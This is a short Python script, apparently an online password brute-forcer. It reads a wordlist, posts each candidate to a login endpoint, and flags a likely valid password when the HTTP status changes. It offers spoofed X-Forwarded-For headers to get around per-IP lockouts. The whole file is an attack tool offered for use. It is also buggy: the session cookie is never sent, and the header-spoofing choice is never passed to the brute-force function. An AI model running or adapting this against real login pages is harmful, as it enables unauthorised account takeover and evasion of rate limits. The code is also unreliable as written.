import requests
import re

sessionValue=" "
host=" "
passlist=""
payloadParam1=" "
pValue1Begin=" "
pValue1End=""

def guess_word(word,supportXforward=False,nr=1):
    cookie={'session':sessionValue}
    value=pValue1Begin+str(word)+pValue1End
    payload = {payloadParam1:value}
    hed={'X-Forwarded-For':'192.168.53.'+str(nr)}
    try:
        if supportXforward:
            response = requests.post(host ,data=payload,headers=hed)
        else:
            response = requests.post(host ,data=payload)

    except Exception as e:
        print(e)
    res_status = response.status_code
    #or check     
    #res_status = response.history
    return res_status
 
 
def open_passlist_file(filepath):
    file=open(filepath,'r')
    lists=file.readlines()
    words=[]
    for i in range(len(lists)):
        words.append(lists[i].rstrip('\n').split(',')[0])        
    return words

try:
    #filepath=input("Enter a filepath: ")
    filepath=" "
    passlist=open_passlist_file(filepath)
except Exception as e:
        print(e)


def brute(supportXforward=False):
    response_stat=guess_word("admin",supportXforward)
    tryNr=1
    for word in passlist:
        new_status=guess_word(word,supportXforward,tryNr+1)
        print("TRY NR: "+str(tryNr)+" pass: "+str(word)+" =  "+str(new_status))
        tryNr+=1
        if response_stat!=new_status:
            print("valid password can be: "+word)
            break


supportXforward=int(input("Do web support-X-forward[1/0]: "))

if supportXforward==1:
    supportXforward=True
else:
    supportXforward=False

brute()
